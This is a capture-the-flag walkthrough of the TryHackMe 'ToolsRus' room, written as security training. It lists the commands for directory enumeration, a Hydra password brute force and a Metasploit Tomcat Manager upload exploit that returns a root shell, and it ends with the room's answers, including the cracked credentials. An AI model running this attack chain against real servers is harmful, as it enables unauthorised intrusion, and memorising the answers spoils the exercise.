# ToolsRus – TryHackMe

 1. Recon
Nmap scan:
sudo nmap -sC -sV -oN <IP>
Open ports:
22 (SSH)
80 (HTTP)
1234 (Apache Tomcat)

2. Website (Port 80)
Browsing the main site → nothing interesting.
Used gobuster:
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
Discovered:
/guidelines
/protected
In /guidelines I found the username bob.
In /protected I encountered a BasicAuth prompt.

3. Brute-force login
Used Hydra to brute-force the password:
hydra -l bob -P /usr/share/wordlists/rockyou.txt <IP> http-get /protected/
Success: bob : bubbles

4. Tomcat (Port 1234)
Scanning port 1234:
nmap -sC -sV -p1234 <IP>
Service: Apache Tomcat/7.0.88

Nikto scan:
nikto -host http://<IP>:1234/manager/html -id bob:bubbles
Discovered access to Tomcat Manager.

5. Exploitation
Using Metasploit:
msfconsole
search tomcat_mgr_upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
set TARGETURI /manager/html
set LHOST <your_IP>
run
Got a shell:
whoami
→ root

6. Flag
cd /root
cat flag.txt
Flag retrieved ✅

Answers to the Questions:

What port is Tomcat running on?
1234

What is the username found on the website?
bob

What is bob’s password?
bubbles

What version of Apache Tomcat is running?
7.0.88

What exploit was used to gain access?
tomcat_mgr_upload

What is the user flag?
(found inside flag.txt after exploitation)

Key Takeaways:
gobuster is useful to enumerate hidden directories.
Hydra works well against BasicAuth.
Tomcat Manager can be exploited with valid credentials.
Metasploit module tomcat_mgr_upload provides direct root access.
